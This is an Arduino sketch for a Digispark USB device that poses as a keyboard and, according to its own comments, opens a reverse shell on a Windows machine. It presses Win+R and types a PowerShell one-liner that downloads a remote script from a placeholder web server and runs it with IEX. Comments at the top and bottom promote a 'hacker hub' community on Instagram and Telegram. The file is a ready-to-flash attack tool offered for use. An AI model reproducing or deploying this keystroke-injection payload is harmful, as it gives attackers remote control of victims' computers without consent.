// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
// Credits to hak5 and samratashok (developer of the nishang framework).
//follow our community hacker hub8
//our instagram - @hacker_hu8
//our telegram - @hacker_hub8
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}


//follow our community hacker hub8
//our instagram - @hacker_hu8
//our telegram - @hacker_hub8